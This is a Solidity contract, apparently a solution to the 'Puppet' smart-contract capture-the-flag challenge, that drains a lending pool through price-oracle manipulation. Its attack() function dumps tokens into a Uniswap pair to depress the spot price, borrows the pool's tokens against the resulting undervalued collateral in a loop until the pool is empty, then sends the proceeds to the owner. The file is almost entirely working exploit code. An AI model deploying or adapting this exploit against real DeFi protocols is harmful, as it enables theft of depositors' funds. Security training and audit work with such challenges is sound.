// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "solmate/src/tokens/ERC20.sol";

import {PuppetPool} from "./PuppetPool.sol";
import {IUniswapExchange} from "./IUniswapExchange.sol";

contract PuppetPoolAttacker {
    address owner;
    address uniswapPair;
    address puppetPool;
    address token;
    uint256 counter;

    constructor(
        address _owner,
        address _uniswapPair,
        address _puppetPool,
        address _token
    ) {
        owner = _owner;

        uniswapPair = _uniswapPair;
        puppetPool = _puppetPool;
        token = _token;
    }

    function attack() external {
        //approve to uniswap
        ERC20(token).approve(uniswapPair, type(uint256).max);
        while (ERC20(token).balanceOf(puppetPool) > 0) {

            uint256 poolTokenBalance = ERC20(token).balanceOf(puppetPool);
            uint256 amountEtherRequireToDrainPool = PuppetPool(puppetPool)
                .calculateDepositRequired(poolTokenBalance);

            uint256 currentTokenBalanceOfThis = ERC20(token).balanceOf(
                address(this)
            );

            //swap
            IUniswapExchange(uniswapPair).tokenToEthSwapInput(
                currentTokenBalanceOfThis,
                1,
                block.timestamp + 10
            );

            //if we can drain it, drain
            if (address(this).balance >= amountEtherRequireToDrainPool) {
                PuppetPool(puppetPool).borrow{value: address(this).balance}(
                    poolTokenBalance,
                    address(this)
                );
            } else {
                uint256 amount = (address(this).balance * poolTokenBalance) /
                    amountEtherRequireToDrainPool;
                //borrow
                PuppetPool(puppetPool).borrow{value: address(this).balance}(
                    amount,
                    address(this)
                );
            }
            counter++;
        }
        //swap eth -> token
        IUniswapExchange(uniswapPair).ethToTokenSwapInput{
            value: address(this).balance
        }(1, block.timestamp + 10);

        //transfer token to player
        ERC20(token).transfer(owner, ERC20(token).balanceOf(address(this)));
    }

    receive() external payable {}
}
